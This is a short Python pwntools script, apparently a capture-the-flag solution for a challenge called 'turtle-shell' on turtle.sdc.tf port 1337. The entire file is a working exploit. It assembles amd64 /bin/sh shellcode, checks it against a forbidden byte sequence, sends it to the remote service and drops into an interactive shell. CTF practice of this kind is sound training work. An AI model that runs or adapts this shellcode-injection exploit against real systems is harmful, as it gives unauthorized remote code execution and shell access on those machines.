from pwn import *
import sys

elf = ELF("turtle-shell")

# io = process(elf.path)
io = remote('turtle.sdc.tf', 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

shellcode = asm(shellcraft.sh())
bad = b'\x78\x07\x40'

print(len(shellcode))


if bad in shellcode:
    print("detected!")
    exit()

io.sendlineafter(b'shell\n', shellcode)

io.interactive()